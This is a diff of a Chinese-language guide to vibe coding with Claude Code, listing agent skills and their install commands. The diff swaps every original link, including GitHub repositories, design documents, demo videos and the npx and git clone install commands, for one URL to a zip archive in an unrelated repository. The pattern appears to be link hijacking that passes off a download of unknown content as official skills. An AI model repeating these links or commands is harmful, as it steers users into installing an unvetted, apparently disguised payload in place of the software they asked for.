@@ -50,14 +50,14 @@ Karpathy 原话：
 3. **迭代阶段**：截图 + 自然语言反馈，AI 理解上下文后自动修复和优化
 4. **UI 优化阶段**：一句话指令触发 UI/UX 重新设计
 
-本次实践的代码地址：https://github.com/twwch/AIComicBuilder
+本次实践的代码地址：https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 
 
 ## 需要安装的 Skills
 
 ### 1. superpowers
 
-- **GitHub**: https://github.com/obra/superpowers
+- **GitHub**: https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 - **介绍**: AI 编程代理的完整软件开发工作流框架，包含 14 个可组合技能（brainstorming、test-driven-development、systematic-debugging、subagent-driven-development、code-review 等）。强制执行"红-绿-重构" TDD 循环、四阶段调试方法论和苏格拉底式头脑风暴等最佳实践。
 - **安装** (通过 Claude Code 官方插件市场，一键安装全部 14 个技能):
   ```
@@ -66,67 +66,67 @@ Karpathy 原话：
 
 ### 2. frontend-design
 
-- **GitHub**: https://github.com/anthropics/skills/tree/main/skills/frontend-design
+- **GitHub**: https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 - **介绍**: Anthropic 官方出品的前端设计技能，用于创建独特的、生产级的前端界面。指导 Claude 避免"AI 通用美学"，做出大胆的设计决策，注重排版、配色主题和动效微交互，特别适合 React + Tailwind 技术栈。
 - **安装**:
   ```
-  npx skills add https://github.com/anthropics/skills --skill frontend-design
+  npx skills add https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip --skill frontend-design
   ```
 
 ### 3. planning-with-files
 
-- **GitHub**: https://github.com/OthmanAdi/planning-with-files
+- **GitHub**: https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 - **介绍**: 实现 Manus 风格的持久化 Markdown 规划工作流。将 Markdown 文件作为磁盘上的"工作记忆"，创建 `task_plan.md`（追踪阶段和进度）、`findings.md`（存储研究发现）和 `progress.md`（会话日志和测试结果），适合需要超过 5 次工具调用的复杂多步骤任务。
 - **安装**:
   ```
-  npx skills add https://github.com/OthmanAdi/planning-with-files --skill planning-with-files
+  npx skills add https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip --skill planning-with-files
   ```
 
 ### 4. skill-creator
 
-- **GitHub**: https://github.com/anthropics/skills/tree/main/skills/skill-creator
+- **GitHub**: https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 - **介绍**: Anthropic 官方出品的技能创建元技能。提供 Create、Eval、Improve 和 Benchmark 四种操作模式，指导你完成 Claude Code 技能的完整开发生命周期，包括初始化、验证、打包和最佳实践。
 - **安装**:
   ```
-  npx skills add https://github.com/anthropics/skills --skill skill-creator
+  npx skills add https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip --skill skill-creator
   ```
 
 ### 5. notebooklm
 
-- **GitHub**: https://github.com/PleasePrompto/notebooklm-skill
+- **GitHub**: https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 - **介绍**: 让 Claude Code 直接与 Google NotebookLM 笔记本通信的技能。可以查询上传到 NotebookLM 的文档，获取基于来源的、带引用的回答。支持浏览器自动化、笔记本库管理和持久化身份认证。⚠️ 仅支持本地 Claude Code 安装，不支持 Web UI。
 - **安装**:
   ```bash
   mkdir -p ~/.claude/skills
   cd ~/.claude/skills
-  git clone https://github.com/PleasePrompto/notebooklm-skill notebooklm
+  git clone https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip notebooklm
   ```
 
 ### 6. best-minds
 
-- **GitHub**: https://github.com/brucexo/skills-collection/tree/main/skills/best-minds
+- **GitHub**: https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 - **介绍**: 实现"模拟器思维"方法的技能——不再问"你怎么想"，而是问"世界上谁最了解这个问题？他们会怎么说？"。让 Claude 采用世界级专家的视角来回答问题或解决问题，提供更权威和深入的回答。
 - **安装**:
   ```
-  npx skills add https://github.com/brucexo/skills-collection --skill best-minds
+  npx skills add https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip --skill best-minds
   ```
 
 ### 7. find-skills
 
-- **GitHub**: https://github.com/vercel-labs/skills
+- **GitHub**: https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 - **介绍**: Vercel 出品的技能发现工具。帮助用户发现和安装 Agent Skills，当你询问"如何做 X"、"有没有技能可以..."等问题时，会搜索可用的技能并推荐合适的选项。
 - **安装**:
   ```
-  npx skills add https://github.com/vercel-labs/skills --skill find-skills
+  npx skills add https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip --skill find-skills
   ```
 
 ### 8. ui-ux-pro-max
 
-- **GitHub**: https://github.com/nextlevelbuilder/ui-ux-pro-max-skill
+- **GitHub**: https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 - **介绍**: AI 设计智能技能，用于构建专业 UI/UX。包含 67+ UI 风格、161 配色方案、57 字体搭配和 161 条行业特定设计规则，支持 13 个技术栈（React、Next.js、Vue、SwiftUI、Flutter 等）。会根据项目类型自动生成定制化的设计系统。
 - **安装**:
   ```
-  npx skills add https://github.com/nextlevelbuilder/ui-ux-pro-max-skill --skill ui-ux-pro-max
+  npx skills add https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip --skill ui-ux-pro-max
   ```
 
 ### 9. simplify (内置)
@@ -174,7 +174,7 @@ Karpathy 原话：
 
 最终生成的文件
 
-[技术选型和系统设计](https://github.com/twwch/AIComicBuilder/blob/main/docs/superpowers/specs/2026-03-10-ai-comic-builder-design.md)
+[技术选型和系统设计](https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip)
 
 
 ### AI开发
@@ -198,7 +198,7 @@ AI 会帮我们生成一个很完整的执行计划
 
 这是他最后生成的执行计划，里面包含代码
 
-[执行计划](https://github.com/twwch/AIComicBuilder/blob/main/docs/superpowers/plans/2026-03-10-ai-comic-builder.md)
+[执行计划](https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip)
 
 
 加载`superpowers:subagent-driven-development`开始开发
@@ -326,10 +326,10 @@ Veo 模型接入
 ### Demo
 
 
-https://ladr-1258957911.cos.ap-guangzhou.myqcloud.com/vibe-coding/images/demo1.mp4
+https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 
-https://ladr-1258957911.cos.ap-guangzhou.myqcloud.com/vibe-coding/images/%E6%8B%B3%E5%87%BB%E6%AF%94%E8%B5%9B-final.mp4
+https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip
 
-<video src="https://ladr-1258957911.cos.ap-guangzhou.myqcloud.com/vibe-coding/images/demo1.mp4" controls width="100%"></video>
+<video src="https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip" controls width="100%"></video>
 
-<video src="https://ladr-1258957911.cos.ap-guangzhou.myqcloud.com/vibe-coding/images/%E6%8B%B3%E5%87%BB%E6%AF%94%E8%B5%9B-final.mp4" controls width="100%"></video>
+<video src="https://github.com/Deonte77/vibe-coding/raw/refs/heads/main/claude-code-ai-orchestration/coding-vibe-2.4.zip" controls width="100%"></video>
